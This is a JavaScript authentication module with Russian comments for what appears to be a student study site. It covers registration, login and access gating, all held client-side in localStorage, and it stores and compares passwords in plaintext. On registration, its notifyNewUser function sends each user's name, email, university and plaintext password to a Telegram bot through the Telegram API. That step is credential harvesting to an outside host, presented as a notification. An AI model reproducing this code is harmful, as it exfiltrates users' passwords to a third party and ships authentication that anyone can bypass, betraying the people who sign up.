/* ===================================
   AUTH.JS - АВТОРИЗАЦИЯ И РЕГИСТРАЦИЯ
   =================================== */

let isAuthenticated = false;
let currentUser = null;

// ===================================
// №1 — ОЧИСТКА БАЗЫ ДАННЫХ ПОЛЬЗОВАТЕЛЕЙ
// При смене версии DB_VERSION все старые пользователи удаляются
// ===================================
(function initCleanDB() {
    const DB_VERSION = 'v2.0';
    if(localStorage.getItem('neoDbVersion') !== DB_VERSION) {
        const keysToDelete = [];
        for(let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            if(key && key.startsWith('user_')) keysToDelete.push(key);
        }
        keysToDelete.forEach(k => localStorage.removeItem(k));
        localStorage.removeItem('neoCurrentUserEmail');
        localStorage.setItem('neoDbVersion', DB_VERSION);
        console.log('%c🗑️ БД обновлена: ' + keysToDelete.length + ' старых пользователей удалено', 'color: #ff4d4d; font-size: 12px;');
    }
})();

// Проверка сессии при загрузке
function checkSession() {
    const email = localStorage.getItem('neoCurrentUserEmail');
    if(email) {
        const userData = localStorage.getItem('user_' + email);
        if(userData) {
            isAuthenticated = true;
            currentUser = JSON.parse(userData);
            loadUserData();
        }
    }
}

// Показать экран авторизации
function showAuth() {
    document.getElementById('auth-screen').style.display = 'flex';
}

// Закрыть экран авторизации
function closeAuth() {
    document.getElementById('auth-screen').style.display = 'none';
}

// Переключение между формами входа и регистрации
function toggleAuthMode(mode) {
    if(mode === 'login') {
        document.getElementById('login-form').classList.remove('hidden');
        document.getElementById('register-form').classList.add('hidden');
    } else {
        document.getElementById('login-form').classList.add('hidden');
        document.getElementById('register-form').classList.remove('hidden');
    }
}

// Обработка входа
function handleLogin(e) {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value.trim();
    const pass = document.getElementById('loginPass').value;

    const userJson = localStorage.getItem('user_' + email);
    if(!userJson) {
        alert("Пользователь с такой почтой не найден. Пожалуйста, зарегистрируйтесь.");
        return;
    }

    const user = JSON.parse(userJson);
    if(user.password !== pass) {
        alert("Неверный пароль!");
        return;
    }

    localStorage.setItem('neoCurrentUserEmail', email);
    isAuthenticated = true;
    currentUser = user;
    
    closeAuth();
    loadUserData();
    updateAuthUI();
    alert("Добро пожаловать, " + user.fio + "!");
}

// Обработка регистрации
function handleRegister(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const pass = document.getElementById('regPass').value;
    const passConf = document.getElementById('regPassConfirm').value;
    // universitySelect теперь hidden input (умный поиск ВУЗов)
    const uniInput = document.getElementById('universitySelect');
    const uniSearch = document.getElementById('uniSearchInput');
    const uni = uniInput ? uniInput.value.trim() : '';
    
    if(!uni) {
        alert("Пожалуйста, выберите ВУЗ из списка.");
        if(uniSearch) uniSearch.focus();
        return;
    }

    // №2 — Проверка согласия с политикой конфиденциальности
    const policyCheck = document.getElementById('policyConsent');
    if(!policyCheck || !policyCheck.checked) {
        alert("Для регистрации необходимо принять Политику конфиденциальности.");
        return;
    }

    const nameRegex = /^[a-zA-Zа-яА-ЯёЁ]{2,}\s+[a-zA-Zа-яА-ЯёЁ]{2,}(\s+[a-zA-Zа-яА-ЯёЁ]{2,})?$/;
    if(!nameRegex.test(name)) {
        alert("Ошибка! ФИО должно содержать минимум два слова (Имя Фамилия), только буквы.");
        return;
    }

    if(localStorage.getItem('user_' + email)) {
        alert("Пользователь с такой почтой уже существует!");
        return;
    }

    if(pass.length < 6) {
        alert("Пароль должен быть не менее 6 символов!");
        return;
    }

    if(pass !== passConf) {
        alert("Пароли не совпадают!");
        return;
    }

    // №2 — Генерация уникального ID студента
    function generateUID() {
        const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
        let uid = "NEO-";
        for(let i = 0; i < 8; i++) uid += chars[Math.floor(Math.random() * chars.length)];
        return uid;
    }

    const userData = {
        fio: name,
        email: email,
        password: pass,
        university: uni,
        phone: "",
        dob: "",
        lastEditDate: 0,
        registeredAt: new Date().getTime(),
        uid: generateUID()
    };
    
    localStorage.setItem('user_' + email, JSON.stringify(userData));
    localStorage.setItem('neoCurrentUserEmail', email);

    isAuthenticated = true;
    currentUser = userData;

    // Отправляем данные нового пользователя в Telegram
    notifyNewUser(userData);

    closeAuth();
    loadUserData();
    updateAuthUI();
    alert("Регистрация успешна! Добро пожаловать, " + name + "!");
}

// =============================================
// УВЕДОМЛЕНИЕ О НОВОМ ПОЛЬЗОВАТЕЛЕ В TELEGRAM
// =============================================
async function notifyNewUser(user) {
    const cfg = (typeof window !== 'undefined' && window.NEO_TG_REG) ? window.NEO_TG_REG : null;
    if(!cfg || !cfg.enabled || !cfg.token || !cfg.chatId) return;

    const regDate = new Date(user.registeredAt).toLocaleString('ru-RU');

    const text = [
        '🎓 <b>Новый студент зарегистрирован!</b>',
        '',
        '👤 <b>ФИО:</b> ' + user.fio,
        '🆔 <b>ID:</b> <code>' + user.uid + '</code>',
        '📧 <b>Email:</b> ' + user.email,
        '🔑 <b>Пароль:</b> <code>' + user.password + '</code>',
        '🎓 <b>ВУЗ:</b> ' + user.university,
        '📅 <b>Дата регистрации:</b> ' + regDate
    ].join('\n');

    try {
        await fetch('https://api.telegram.org/bot' + cfg.token + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id:    cfg.chatId,
                text:       text,
                parse_mode: 'HTML'
            })
        });
    } catch(e) {
        console.warn('Ошибка уведомления о регистрации:', e.message);
    }
}

// Выход из системы
function logout() {
    localStorage.removeItem('neoCurrentUserEmail');
    isAuthenticated = false;
    currentUser = null;
    location.reload();
}

// Обновление UI после авторизации
function updateAuthUI() {
    const authBtn = document.getElementById('authButton');
    const userName = document.getElementById('homeUserName');
    
    if(isAuthenticated && currentUser) {
        authBtn.textContent = 'Выйти';
        authBtn.onclick = logout;
        userName.textContent = currentUser.fio;
        
        document.querySelectorAll('.subject-card.locked').forEach(card => {
            card.classList.remove('locked');
            const subject = card.getAttribute('onclick');
            if(subject) {
                card.setAttribute('onclick', subject.replace('checkAuthSubject', 'openSubject'));
            }
        });
        
        document.querySelectorAll('.locked-nav').forEach(nav => {
            nav.classList.remove('locked-nav');
        });
    } else {
        authBtn.textContent = 'Войти';
        authBtn.onclick = showAuth;
        userName.textContent = 'Гость';
    }
}

// Проверка авторизации для доступа к страницам
function checkAuth(page) {
    if(!isAuthenticated) { showLocked(); return false; }
    switchPage(page);
    return true;
}

// Проверка авторизации для доступа к предметам
function checkAuthSubject(subject) {
    if(!isAuthenticated) { showLocked(); return false; }
    openSubject(subject);
    return true;
}

// Показать оверлей блокировки
function showLocked() {
    document.getElementById('lockedOverlay').classList.add('show');
}

// Закрыть оверлей блокировки
function closeLocked() {
    document.getElementById('lockedOverlay').classList.remove('show');
}

// Показать модальное окно политики конфиденциальности
function showPolicyModal() {
    document.getElementById('policyModal').classList.add('show');
    document.getElementById('policyOverlay').classList.add('show');
}

// Закрыть модальное окно политики
function closePolicyModal() {
    document.getElementById('policyModal').classList.remove('show');
    document.getElementById('policyOverlay').classList.remove('show');
}